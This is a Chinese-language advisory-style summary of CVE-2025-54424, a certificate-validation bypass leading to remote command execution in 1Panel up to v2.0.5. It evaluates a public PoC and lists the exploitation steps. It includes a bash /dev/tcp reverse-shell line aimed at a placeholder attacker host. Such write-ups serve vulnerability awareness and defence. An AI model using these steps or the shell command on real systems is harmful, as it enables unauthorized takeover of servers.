## CVE-2025-54424 - 1Panel 远程命令执行 (RCE), 证书验证绕过

**漏洞编号:** CVE-2025-54424

**漏洞类型:** 远程命令执行 (RCE), 证书验证绕过

**影响应用:** 1Panel

**危害等级:** 高危

**CVSS评分:** N/A

**影响版本:** 1Panel <= v2.0.5

**利用条件:** 无需认证，需要网络访问，利用客户端证书验证绕过。

**POC 可用性:** 10/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-54424是一个针对开源服务器运维面板1Panel的远程命令执行漏洞。该漏洞的核心是1Panel Agent与主节点通信机制中的TLS证书校验逻辑缺陷。具体而言，受影响版本的Agent端TLS认证策略配置为`tls.RequireAnyClientCert`，并结合了对客户端证书Common Name (CN)字段的特定检查（要求CN为'panel_client'）。攻击者可以利用此缺陷，动态生成一个自签名的客户端TLS证书，并伪造其CN字段为'panel_client'。通过使用这个伪造的证书，攻击者可以成功绕过1Panel Agent的认证机制，进而通过Agent提供的WebSocket接口发送恶意指令，最终在目标服务器上实现任意代码执行（RCE）。

**POC有效性分析**
所提供的Python POC脚本（例如`CVE-2025-54424.py`）是一个高度有效且功能完整的利用工具。该脚本的核心优势在于其能够动态生成符合要求的自签名客户端证书，其Common Name被设置为`panel_client`，这精确地模拟了漏洞利用的关键一步。脚本首先通过一个HTTPS GET请求（例如访问`/api/v2/dashboard/base/os`）来验证伪造证书的有效性，如果收到200 OK响应，则确认目标存在漏洞且证书绕过成功。随后，脚本会建立一个安全的WebSocket连接，并利用此连接向Agent发送JSON格式的命令，实现远程代码执行，甚至可以建立反向Shell。该POC支持并发扫描和利用，具有良好的错误处理和临时文件（证书）清理机制，体现了很高的可用性和稳定性。其集成的参数解析功能允许用户轻松指定目标、端口、待执行命令以及反向Shell的监听主机和端口，使得漏洞的验证和利用过程高度自动化。因此，该POC被评定为功能完整、可用性极高。

**利用步骤**
1.  **目标识别**：攻击者首先需要识别运行着受影响版本1Panel Agent的目标服务器。Agent通常监听在特定端口（如8888、8080等），并提供HTTPS服务。
2.  **证书伪造**：攻击者利用工具（如POC脚本）动态生成一个自签名的TLS客户端证书和对应的私钥。在此过程中，必须将证书的Common Name (CN)字段精确地设置为`panel_client`。
3.  **身份认证绕过**：攻击者使用伪造的证书和私钥，向1Panel Agent发起HTTPS请求（例如，请求`/api/v2/dashboard/base/os`）。由于Agent的`tls.RequireAnyClientCert`策略和对`panel_client`CN的认可，服务器会错误地认为这是一个合法的客户端请求，从而允许认证通过。
4.  **建立WebSocket连接**：一旦初始认证成功，攻击者将利用相同的伪造证书建立一个安全的WebSocket连接（WSS）到1Panel Agent的WebSocket服务端口。
5.  **远程命令执行**：通过已建立的认证WebSocket通道，攻击者可以发送JSON格式的命令请求。这些命令将被1Panel Agent接收并以其运行权限在宿主操作系统上执行。例如，攻击者可以注入一个Linux反向Shell命令（如`bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1`），以获取目标的交互式Shell。

**投毒风险分析**
对所提供的`CVE-2025-54424.py` POC代码进行分析后，其投毒风险评估为低（10%）。该脚本以Python编写，代码结构清晰，使用了`requests`、`websocket-client`、`cryptography`等知名且广泛审查的标准库和第三方库。代码中没有发现任何明显的混淆技术、恶意加密或编码字符串，也没有尝试从外部非指定源下载或执行其他可疑代码的行为。脚本的主要功能是动态生成符合漏洞利用条件的自签名证书，并通过HTTP和WebSocket协议与目标服务器进行交互，以验证漏洞和执行用户指定的命令。其所有操作都直接围绕着漏洞的利用逻辑展开。脚本中的反向Shell代码（例如`bash -i >& /dev/tcp/{ip}/{port} 0>&1`）是常见的渗透测试Payload，属于利用后的行为，而非POC代码本身的恶意组成部分。禁用SSL验证（`verify=False`）和抑制`InsecureRequestWarning`在测试自签名证书或绕过SSL验证的场景下是常见的做法，并不代表POC本身具有恶意意图。总体而言，该POC是一个专注于漏洞利用的合法安全研究工具，其设计和实现均符合常规的白帽安全工具标准，不包含旨在损害使用者系统或窃取信息的隐藏恶意功能。使用者在运行前仍应审慎审查代码，并确保从可信来源获取。


**项目地址:** https://github.com/hophtien/CVE-2025-54424

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-54424
